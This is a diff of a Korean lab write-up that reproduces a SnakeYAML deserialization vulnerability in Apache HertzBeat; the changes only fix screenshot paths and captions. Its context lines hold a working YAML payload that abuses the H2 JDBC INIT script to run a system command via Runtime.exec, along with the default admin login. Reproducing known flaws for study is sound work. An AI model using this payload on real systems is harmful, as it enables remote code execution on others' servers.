@@ -16,9 +16,9 @@ Apache HertzBeat는 오픈소스 실시간 모니터링 및 경고 도구로, �
 
 브라우저에서 http://<your-ip>:1157/dashboard로 접속할 수 있으며, 기본 로그인 정보는 다음과 같습니다:
 
-![스크린샷 2025-04-26 오후 7.43.51](/Users/hansohui/Library/Application Support/typora-user-images/스크린샷 2025-04-26 오후 7.43.51.png)
+![docker compose 실행 화면](images/스크린샷 2025-04-26 오후 7.43.51.png)
 
-![스크린샷 2025-04-26 오후 7.55.00](/Users/hansohui/Library/Application Support/typora-user-images/스크린샷 2025-04-26 오후 7.55.00.png)
+![hertzbeat 로그인 화면](images/스크린샷 2025-04-26 오후 7.55.00.png)
 
 - 아이디: admin
 - 비밀번호: hertzbeat
@@ -33,7 +33,7 @@ Apache HertzBeat는 오픈소스 실시간 모니터링 및 경고 도구로, �
 
 `!!org.h2.jdbc.JdbcConnection [ "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException { Runtime.getRuntime().exec(\"touch /tmp/success\")\\; }$$\\;CALL EXEC ()\\;", [], "a", "b", false ]`
 
-![스크린샷 2025-04-27 오전 3.21.59](/Users/hansohui/Library/Application Support/typora-user-images/스크린샷 2025-04-27 오전 3.21.59.png)
+![.yaml 파일 생성 화면](images/스크린샷 2025-04-26 오후 8.03.19.png)
 
 - SnakeYAML은 II로 시작되는 Java 객체를 역직렬화합니다.
 - 위 페이로드는 **org.h2.jdbc.JdbcConnection 객체를 생성**하며, 내부적으로 **H2 데이터베이스의 INIT 명령어**를 통해 시스템 명령어(touch /tmp/success)를 실행하게 만듭니다.
@@ -45,7 +45,7 @@ Apache HertzBeat는 오픈소스 실시간 모니터링 및 경고 도구로, �
 
 HertzBeat 대시보드에 로그인 후, 모니터링 설정 화면으로 이동합니다.
 
-![스크린샷 2025-04-26 오후 8.03.19](/Users/hansohui/Library/Application Support/typora-user-images/스크린샷 2025-04-26 오후 8.03.19.png)
+![import 화면](images/스크린샷 2025-04-27 오전 3.21.59.png)
 
 
 
@@ -62,7 +62,7 @@ HertzBeat 대시보드에 로그인 후, 모니터링 설정 화면으로 이동
 
 `docker exec -t <컨테이너 ID> ls /tmp`
 
-![스크린샷 2025-04-27 오전 12.55.07](/Users/hansohui/Library/Application Support/typora-user-images/스크린샷 2025-04-27 오전 12.55.07.png)
+![sucess 화면](images/스크린샷 2025-04-27 오전 12.55.07.png)
 
 
 
